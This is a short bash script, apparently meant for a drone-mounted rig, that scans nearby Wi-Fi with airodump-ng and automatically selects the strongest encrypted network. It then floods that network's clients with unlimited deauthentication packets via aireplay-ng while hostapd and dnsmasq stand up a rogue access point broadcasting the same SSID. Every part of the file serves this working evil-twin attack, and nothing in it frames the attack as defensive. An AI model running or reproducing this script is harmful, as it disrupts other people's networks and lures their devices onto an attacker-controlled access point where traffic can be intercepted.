#!/bin/bash
#remove any past .csv files from previous flights
rm /root/wifidump/*
rm /root/hostapd.conf



#within a seperate terminal run airodump-ng for 15 seconds before stopping. Output the dump to directory wifidump using wlan1mon
xterm -e timeout 15s airodump-ng -w /root/wifidump/dump wlan1mon


# remove .kismet.csv and .cap dumps from the wifidump
rm /root/wifidump/*.kismet*
rm /root/wifidump/*.cap

# using Sort, grep, cut, and head assign CHA-channel  ESSID- SSID   BSSID- MAC for the strongest signal that isnt hidden or our mobile hotspot
export CHA=`sort -t ',' -nk 9 -r /root/wifidump/dump-0?.csv | grep -i -e "WPA" -e "WPA2" -e "WEP" | grep -vi -e ", ," -e "\x" -e "verizon*" | cut -d, -f 4 | head -n 1`
export ESSID=`sort -t ',' -nk 9 -r /root/wifidump/dump-0?.csv | grep -i -e "WPA" -e "WPA2" -e "WEP" | grep -vi -e ", ," -e "\x" -e "verizon*" | cut -d, -f 14 | head -n 1`
export BSSID=`sort -t ',' -nk 9 -r /root/wifidump/dump-0?.csv | grep -i -e "WPA" -e "WPA2" -e "WEP" | grep -vi -e ", ," -e "\x" -e "verizon*" | cut -d, -f 1 | head -n 1`

#echo the found information for troubleshooting/accuracy
echo $CHA
echo $ESSID
echo $BSSID


airmon-ng stop wlan1mon

iwconfig wlan1 channel $CHA
ifconfig wlan1 up

ifconfig wlan1 10.0.0.1

aireplay-ng --deauth 0 wlan1 -e $ESSID -a $BSSID&

echo -e "interface=wlan1\ndriver=nl80211\nssid="$ESSID"\nhw_mode=g\nchannel="$CHA"\nmacaddr_acl=0\nauth_algs=3\nignore_broadcast_ssid=0" > hostapd.conf



hostapd hostapd.conf&dnsmasq -C dnsmasq.conf -d 
